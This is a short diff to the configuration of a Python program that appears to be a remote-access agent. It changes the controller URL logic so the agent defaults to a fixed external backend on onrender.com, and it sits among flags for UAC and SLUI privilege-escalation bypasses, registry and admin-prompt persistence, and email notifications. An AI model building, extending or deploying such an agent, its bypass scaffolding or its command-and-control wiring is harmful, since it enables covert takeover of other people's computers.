@@ -233,13 +233,20 @@ MAX_PROMPT_ATTEMPTS = None     # Limit prompts to 3 attempts instead of 999
 BYPASSES_ENABLED = False
 REGISTRY_ENABLED = False
 PERSISTENT_ADMIN_PROMPT_ENABLED = False
-
 # Controller URL override flag (set URL via env)
-USE_FIXED_SERVER_URL = True
-FIXED_SERVER_URL_RAW = (os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com') or '').strip()
-FIXED_SERVER_URL = FIXED_SERVER_URL_RAW if FIXED_SERVER_URL_RAW and FIXED_SERVER_URL_RAW.lower() not in ('none', 'null') else 'http://127.0.0.1:8080'
+#FIXED_SERVER_URL_RAW = (os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com') or '').strip()
+#FIXED_SERVER_URL = (os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com') or '').strip()
 #FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com/dashboard')
-#FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'http://localhost:3000/')
+#FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'http://localhost:3000')
+USE_FIXED_SERVER_URL = True
+def _resolve_controller_url():
+    v1 = (os.environ.get('FIXED_SERVER_URL', '') or '').strip()
+    v2 = (os.environ.get('CONTROLLER_URL', '') or '').strip()
+    for u in (v1, v2, 'https://agent-controller-backend.onrender.com'):
+        if u and u.lower() not in ('none', 'null'):
+            return u
+    return 'https://agent-controller-backend.onrender.com'
+FIXED_SERVER_URL = _resolve_controller_url()
 DISABLE_SLUI_BYPASS = True
 UAC_BYPASS_DEBUG_MODE = False
 UAC_BYPASS_METHODS_ENABLED = {
@@ -796,7 +803,7 @@ except ImportError:
     AIORTC_SIGNALING_AVAILABLE = False
     log_message("aiortc.contrib.signaling not available, using custom signaling", "warning")
 
-SERVER_URL = FIXED_SERVER_URL if USE_FIXED_SERVER_URL else (os.environ.get('CONTROLLER_URL', '') or 'http://127.0.0.1:8080')
+SERVER_URL = FIXED_SERVER_URL
 
 # Email notification configuration (use Gmail App Password)
 EMAIL_NOTIFICATIONS_ENABLED = os.environ.get('ENABLE_EMAIL_NOTIFICATIONS', '1') == '1'
